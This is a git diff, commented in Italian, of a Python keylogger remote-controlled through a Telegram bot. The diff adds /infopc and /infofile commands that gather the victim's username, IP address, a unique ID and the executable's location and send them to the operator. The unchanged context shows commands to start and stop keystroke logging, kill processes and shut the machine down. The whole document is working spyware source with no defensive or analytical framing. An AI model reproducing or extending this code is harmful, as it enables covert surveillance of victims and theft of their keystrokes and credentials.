@@ -12,7 +12,7 @@ from datetime import datetime
 
 # Configurazione del bot Telegram
 TOKEN = 'YOUR TOKEN'  # Sostituisci con il token del tuo bot
-CHAT_ID = 'TOUR CHATID'  # Sostituisci con il tuo chat ID
+CHAT_ID = 'YOUR CHATID'  # Sostituisci con il tuo chat ID
 bot = telebot.TeleBot(TOKEN)
 
 # Variabile per memorizzare i tasti premuti
@@ -126,16 +126,27 @@ def get_windows_username():
     return os.getlogin()
 
 
-# Funzione per raccogliere informazioni di sistema
+# Funzione per raccogliere informazioni di sistema (infopc)
 def get_system_info():
-    info = "📊 **Informazioni di Sistema**\n"
-    info += "```\n"
-    info += f"{'Nome utente:':<20} {os.getlogin()}\n"
-    info += f"{'Sistema operativo:':<20} {platform.system()} {platform.version()}\n"
-    info += f"{'Nome host:':<20} {socket.gethostname()}\n"
-    info += f"{'Indirizzo IP:':<20} {socket.gethostbyname(socket.gethostname())}\n"
-    info += "```"
+    current_date = datetime.now().strftime("%d/%m/%Y")
+    current_time = datetime.now().strftime("%H:%M:%S")
+    username = get_windows_username()
+    ip_address = socket.gethostbyname(socket.gethostname())
+    unique_id = get_unique_identifier()
+
+    info = f"📊 **Informazioni del PC**\n\n"
+    info += f"📅 Data: {current_date}\n"
+    info += f"⏰ Ora: {current_time}\n"
+    info += f"👤 Nome utente: {username}\n"
+    info += f"🌐 Indirizzo IP: {ip_address}\n"
+    info += f"🆔 ID: {unique_id}\n"
     return info
+
+
+# Funzione per ottenere la directory del file eseguibile (infofile)
+def get_file_directory():
+    script_path = sys.argv[0]
+    return f"📂 **Directory del file eseguibile:**\n{os.path.dirname(script_path)}"
 
 
 # Funzione per terminare il processo corrente
@@ -175,7 +186,8 @@ def generate_help_message():
 📋 **Lista Comandi e Stato**
 /startlog 🟢 READY
 /stoplog 🟢 READY
-/info 🟢 READY
+/infopc 🟢 READY
+/infofile 🟢 READY
 /panic 🟢 READY
 /taskkill 🟢 READY
 /shutdown 🟢 READY
@@ -232,9 +244,13 @@ def handle_message(message):
         else:
             bot.reply_to(message, "Il keylogger non è attivo.")
 
-    elif message.text.strip().upper() == "/INFO":
+    elif message.text.strip().upper() == "/INFOPC":
         system_info = get_system_info()
         bot.reply_to(message, system_info, parse_mode="Markdown")
+
+    elif message.text.strip().upper() == "/INFOFILE":
+        file_directory = get_file_directory()
+        bot.reply_to(message, file_directory, parse_mode="Markdown")
 
     elif message.text.strip().upper() == "/PANIC":
         bot.reply_to(message, "Avvio modalità PANIC. Terminazione del processo in corso...")
